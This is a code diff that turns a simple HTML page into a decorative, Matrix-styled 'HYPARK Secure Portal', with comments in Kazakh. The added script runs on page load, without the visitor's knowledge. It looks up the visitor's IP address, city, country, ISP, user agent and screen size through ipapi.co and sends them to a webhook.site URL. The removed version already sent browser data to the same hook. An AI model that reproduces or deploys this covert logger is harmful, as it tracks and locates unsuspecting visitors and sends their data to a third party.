@@ -1,13 +1,119 @@
-<h1>Hello Hypark</h1>
-<script>
-  fetch('https://webhook.site/c5965861-5050-4c60-a3a4-38ddf25ad7de', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: JSON.stringify({
-      ua: navigator.userAgent,
-      referrer: document.referrer,
-      time: new Date().toISOString()
-    })
-  });
-</script>
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HYPARK | Secure Portal</title>
+    <style>
+        /* Хакерлік стиль */
+        body {
+            background-color: #050505;
+            color: #00ff41; /* Матрица жасыл түсі немесе #ff0000 қызыл */
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            opacity: 0.1;
+            background: linear-gradient(0deg, rgba(0, 255, 65, 0.1) 10%, transparent 100%);
+        }
+
+        .terminal {
+            border: 1px solid #00ff41;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.9);
+            box-shadow: 0 0 20px #00ff4133;
+            max-width: 80%;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background: #00ff41;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink { 50% { opacity: 0; } }
+
+        h1 { font-size: 2rem; margin: 0; letter-spacing: 5px; }
+        p { color: #888; }
+        .btn {
+            border: 1px solid #00ff41;
+            color: #00ff41;
+            padding: 10px 20px;
+            text-decoration: none;
+            margin-top: 20px;
+            display: inline-block;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #00ff41; color: #000; }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    
+    <div class="terminal">
+        <h1>HYPARK_SYSTEM_v1.0</h1>
+        <p>> Initializing secure connection...</p>
+        <p>> Accessing global database...</p>
+        <div id="status">> Status: <span style="color: #ff0000;">ENCRYPTED</span></div>
+        <br>
+        <a href="#" class="btn" onclick="alert('Access Denied: Level 4 Clearance Required')">ENTER SYSTEM</a>
+        <div class="cursor"></div>
+    </div>
+
+    <script>
+        // Webhook сілтемеңді осы жерге қой:
+        const webhookURL = 'https://webhook.site/c5965861-5050-4c60-a3a4-38ddf25ad7de';
+
+        async function collectData() {
+            try {
+                // IP және жақын жердегі орнын анықтау (тегін сервис арқылы)
+                const response = await fetch('https://ipapi.co/json/');
+                const ipData = await response.json();
+
+                // Webhook-қа жіберу
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        project: "HYPARK_LOGGER",
+                        ip: ipData.ip,
+                        city: ipData.city,
+                        country: ipData.country_name,
+                        isp: ipData.org,
+                        device: navigator.userAgent,
+                        screen: screen.width + "x" + screen.height,
+                        time: new Date().toLocaleString()
+                    })
+                });
+            } catch (e) {
+                // Егер қате кетсе, жай ғана браузер деректерін жібереміз
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        project: "HYPARK_BASIC",
+                        device: navigator.userAgent,
+                        time: new Date().toLocaleString()
+                    })
+                });
+            }
+        }
+
+        // Бет ашылғанда автоматты түрде іске қосу
+        window.onload = collectData;
+    </script>
+</body>
+</html>
 
